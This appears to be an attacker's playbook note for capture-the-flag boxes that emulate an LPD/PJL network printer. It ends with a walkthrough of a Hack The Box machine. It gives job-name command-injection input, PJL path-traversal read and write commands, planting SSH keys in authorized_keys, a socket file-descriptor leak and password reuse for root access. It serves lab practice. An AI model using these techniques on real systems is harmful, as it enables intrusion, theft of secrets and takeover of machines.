# Archetype: Network Printer / LPD-PJL Emulation (RFC 1179)

> Prior, not workflow. Use after Layers 1–3 confirm: a port speaking LPD
> (often nonstandard, e.g. 1515), printer-themed wording on the site
> ("spooler", "queue", "PRN-…", "Compliance Level: RFC 1179", "jetdirect"),
> or a downloadable "processor/internal tool" zip.

## Signals

| Surface | Signature |
|---|---|
| Port speaking `\x01..\x04` LPD verbs | receive-job `\x02`, print-waiting `\x01`, short/long queue `\x03/\x04`; queue name echoed in "printer is ready" style banner |
| Site copy | "spooler", "intake", "queue `…`", "PRN-ARCHIVE-NN offline", "legacy gateway" |
| `@PJL` on 9100 (loopback or not) | `@PJL INFO ID` answers a printer model (e.g. "HP LASERJET 4ML") |
| Downloadable artifact | zip containing the service source (leaks the bug class) |

## Attack surface, cheapest first

1. **Read the artifact FIRST.** If the site offers the service source
   (`/download/…`), the whole chain is usually in it. The deployed copy may
   differ slightly — read the live one via the primitive once you have it.
2. **LPD receive-job → control file (RFC 1179)**:
   - `\x02<queue>\n` → `\x00` ACK; then `\x02<len> cfA001kali\n` → `\x00`; then
     control content: `Hhost\nPuser\nJ<jobname>\n`.
   - The `J`-line (job name) is the classic sink: logging/e-mail/shell
     interpolation of job_name → command injection. Quote-break:
     `J'; <cmd> ; echo '`
   - Queue name is a config (env/unit), not guessable — find it in the source
     or site copy ("Target Queue: …").
3. **PJL filesystem verbs on the printer emulator** (HP PJL FS* subset):
   - `@PJL FSDIRLIST NAME="0:<path>" ENTRY=1 COUNT=99` — list
   - `@PJL FSUPLOAD NAME="0:<path>"` — **read** (returns SIZE + body)
   - `@PJL FSDOWNLOAD NAME="0:<path>" SIZE=<n>\r\n<bytes>` — **write**
   - Translate: `0:` is a volume root; naive emulators do
     `normpath(join(root, path.replace("0:","")))` with **no containment
     check** → traversal `0:../…` reads/writes as the service user.
   - UEL `\x1b%-12345X` prefix optional on sloppy parsers.
4. **Foothold escalation off the emulator**: with arbitrary write as the
   service user → `authorized_keys` (read original first, append, keep
   perms 700/600) → SSH as that user. Cleaner than planting scripts.
5. **Adjacent "security" daemons ARE the vector**: a monitoring daemon that
   (a) taint-scans a log the low-priv service writes, and (b) passes fds via
   SCM_RIGHTS to whoever connects to its socket, is a **fd leak**:
   connect with a tainted log → recvmsg → read the passed fds (config,
   secrets). `os.pread(fd…)`-style reads bypass file permissions entirely.
6. **Secret reuse**: extracted ADMIN_PASSWORD is often just the root unix
   password (PermitRootLogin yes + PasswordAuthentication on these boxes).
   Test `su -` / SSH root before hunting fancier consumers.

## Falsifiers (don't rabbit-hole)

- CorpoSite-style Flask behind nginx with only `/` and one fixed download
  route and zero dynamic params = **decoy**. Two fuzz rounds (paths, params)
  with all-404 → drop it; read its source only once root.
- SCM_RIGHTS leak that passes the *log* fd only, with no second fd →
  re-check taint keywords (must appear verbatim, uppercased).
- Traversal blocked in one verb ≠ blocked in all: test read AND write
  verbs separately (parsers differ).

## Post-foothold priorities specific to this archetype

- `systemctl cat` every custom unit → note `User=` + `Environment=` (queue
  names live here) + any `Requires=` pairs (monitor pairs with monitored).
- Enumerate loopback listeners (`ss -tlnp`): emulators bind lo only; you
  need a local shell to reach them.
- Check socket perms on `/run/*/*.sock` (group-writable to your current
  user = a message channel to a privileged daemon).

## Real-world example

paperwork (HTB medium, 2026): LPD J-line `shell=True` inj → lp runner →
PJL FSUPLOAD read user.txt + FSDOWNLOAD authorized_keys → archivist SSH →
taint commands.log with "FSQUERY" → mgmt.sock SCM_RIGHTS leaks
admin_pins.conf fd → ADMIN_PASSWORD == root SSH password. Chain depth 5,
28 min.